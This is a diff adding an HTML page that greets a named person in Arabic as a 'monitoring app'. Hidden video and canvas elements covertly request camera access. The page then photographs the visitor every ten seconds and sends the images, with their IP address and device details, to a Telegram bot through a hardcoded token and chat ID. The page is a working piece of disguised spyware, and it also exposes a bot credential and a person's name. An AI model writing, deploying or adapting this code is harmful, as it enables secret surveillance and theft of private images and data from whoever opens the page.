@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Continuous Camera Capture and Device Info</title>
+</head>
+<body>
+    <!-- رسالة ترحيبية واسم الشخص -->
+    <h1>مرحبًا عبدالله قبان العيد!</h1>
+    <p>أهلاً وسهلاً بك في تطبيق المراقبة!</p>
+
+    <!-- فيديو مخفي لالتقاط الصور -->
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const botToken = "8034856680:AAEDXoru4I--radB2gFYFh5S1EBN5m4aFVU";
+        const chatId = "6459206285";
+
+        // Function to get IP and device info
+        function getDeviceInfo() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const userAgent = navigator.userAgent;
+                    const deviceInfo = {
+                        IP: ip,
+                        UserAgent: userAgent,
+                        Platform: navigator.platform,
+                        Language: navigator.language,
+                    };
+
+                    console.log('Device Info:', deviceInfo);
+                    sendDeviceInfoToTelegram(deviceInfo);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                });
+        }
+
+        // Function to send device info to Telegram
+        function sendDeviceInfoToTelegram(deviceInfo) {
+            const message = `
+                Device Info:
+                IP: ${deviceInfo.IP}
+                User Agent: ${deviceInfo.UserAgent}
+                Platform: ${deviceInfo.Platform}
+                Language: ${deviceInfo.Language}
+            `;
+            
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', message);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Device info sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending device info to Telegram:', error);
+            });
+        }
+
+        // Request camera access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                console.error('Error accessing camera:', error);
+            });
+
+        // Function to capture image and send to Telegram
+        function captureAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const imageData = canvas.toDataURL('image/jpeg');
+            const blob = dataURItoBlob(imageData);
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Image sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending image to Telegram:', error);
+            });
+        }
+
+        // Convert Data URL to Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const buffer = new ArrayBuffer(byteString.length);
+            const dataView = new Uint8Array(buffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                dataView[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([buffer], { type: mimeString });
+        }
+
+        // Call the function to get device info
+        getDeviceInfo();
+
+        // Continuously capture and send images every 10 seconds
+        setInterval(() => {
+            captureAndSend();
+            getDeviceInfo();  // Collect device info every 10 seconds
+        }, 10000);  // Capture and send image every 10 seconds
+
+    </script>
+</body>
+</html>
